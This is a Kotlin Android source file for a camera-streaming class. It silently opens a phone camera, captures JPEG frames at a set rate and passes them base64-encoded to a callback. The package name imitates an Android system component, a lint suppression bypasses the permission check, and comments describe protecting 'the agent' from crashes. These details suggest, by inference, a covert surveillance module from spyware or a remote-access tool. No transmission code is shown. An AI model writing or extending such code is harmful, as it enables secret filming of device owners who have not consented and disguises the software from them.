package com.android.systemservices

import android.annotation.SuppressLint
import android.content.Context
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.util.Base64
import android.util.Log

class CameraStreamHelper(private val context: Context) {
    private val TAG = "CameraStreamHelper"

    private var cameraDevice: CameraDevice? = null
    private var captureSession: CameraCaptureSession? = null
    private var imageReader: ImageReader? = null
    private var handlerThread: HandlerThread? = null
    private var handler: Handler? = null

    @Volatile var streaming = false
    private var lastFrameMs = 0L

    @SuppressLint("MissingPermission")
    fun start(facing: String, fps: Int, quality: Int, onFrame: (String) -> Unit, onFailure: ((String) -> Unit)? = null) {
        if (streaming) return
        streaming = true
        // CAMERA_IN_USE (a higher-priority/foreground app holding the camera),
        // CameraAccessException, SecurityException etc. must NEVER crash the agent.
        // openCamera() can throw synchronously — wrap the whole setup + report via onFailure.
        try {
            handlerThread = HandlerThread("CamStream").also { it.start() }
            handler = Handler(handlerThread!!.looper)

            val manager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val targetFacing = if (facing == "front") CameraCharacteristics.LENS_FACING_FRONT
                               else CameraCharacteristics.LENS_FACING_BACK
            val cameraId = manager.cameraIdList.firstOrNull { id ->
                manager.getCameraCharacteristics(id)
                    .get(CameraCharacteristics.LENS_FACING) == targetFacing
            } ?: manager.cameraIdList.firstOrNull()
            if (cameraId == null) { stop(); onFailure?.invoke("No camera available"); return }

            val minIntervalMs = 1000L / fps.coerceIn(1, 30)
            val jpegQuality = quality.coerceIn(10, 85).toByte()

            imageReader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 3)
            imageReader!!.setOnImageAvailableListener({ reader ->
                val now = System.currentTimeMillis()
                val img = reader.acquireLatestImage()
                if (img == null || !streaming || now - lastFrameMs < minIntervalMs) {
                    img?.close()
                    return@setOnImageAvailableListener
                }
                lastFrameMs = now
                try {
                    val buf = img.planes[0].buffer
                    val bytes = ByteArray(buf.remaining()).also { buf.get(it) }
                    onFrame(Base64.encodeToString(bytes, Base64.NO_WRAP))
                } finally {
                    img.close()
                }
            }, handler)

            manager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(cam: CameraDevice) {
                    if (!streaming) { cam.close(); return }
                    cameraDevice = cam
                    try {
                        cam.createCaptureSession(
                            listOf(imageReader!!.surface),
                            object : CameraCaptureSession.StateCallback() {
                                override fun onConfigured(session: CameraCaptureSession) {
                                    if (!streaming) { session.close(); return }
                                    captureSession = session
                                    try {
                                        val req = cam.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW).apply {
                                            addTarget(imageReader!!.surface)
                                            set(CaptureRequest.JPEG_QUALITY, jpegQuality)
                                        }.build()
                                        session.setRepeatingRequest(req, null, handler)
                                    } catch (t: Throwable) {
                                        Log.w(TAG, "setRepeatingRequest failed: ${t.message}"); stop(); onFailure?.invoke("Capture failed")
                                    }
                                }
                                override fun onConfigureFailed(s: CameraCaptureSession) {
                                    Log.e(TAG, "Session config failed"); stop(); onFailure?.invoke("Capture session config failed")
                                }
                            },
                            handler
                        )
                    } catch (t: Throwable) {
                        Log.w(TAG, "createCaptureSession failed: ${t.message}"); stop(); onFailure?.invoke("Capture session failed")
                    }
                }
                override fun onDisconnected(cam: CameraDevice) { cam.close(); stop() }
                override fun onError(cam: CameraDevice, error: Int) {
                    // ERROR_CAMERA_IN_USE=1, ERROR_MAX_CAMERAS_IN_USE=2, ERROR_CAMERA_DISABLED=3, ...
                    Log.w(TAG, "Camera StateCallback error: $error"); cam.close(); stop(); onFailure?.invoke("Camera error $error")
                }
            }, handler)
        } catch (t: Throwable) {
            Log.w(TAG, "Camera stream start failed: ${t.message}")
            stop()
            onFailure?.invoke(t.message ?: "Camera unavailable")
        }
    }

    fun stop() {
        streaming = false
        try { captureSession?.stopRepeating() } catch (_: Exception) {}
        try { captureSession?.close() }         catch (_: Exception) {}
        captureSession = null
        try { cameraDevice?.close() }           catch (_: Exception) {}
        cameraDevice = null
        try { imageReader?.close() }            catch (_: Exception) {}
        imageReader = null
        // Capture the thread ref, null the fields, then quit+join.
        // CameraDevice.close() posts onClosed asynchronously to the looper — if we
        // call quitSafely() without joining, the thread may exit before those callbacks
        // fire, leaving a CameraCaptureSession whose GC finalizer then tries to post
        // to a dead Handler ("sending message to a dead thread").
        val ht = handlerThread
        handler = null
        handlerThread = null
        try { ht?.quitSafely(); ht?.join(500) } catch (_: Exception) {}
    }
}
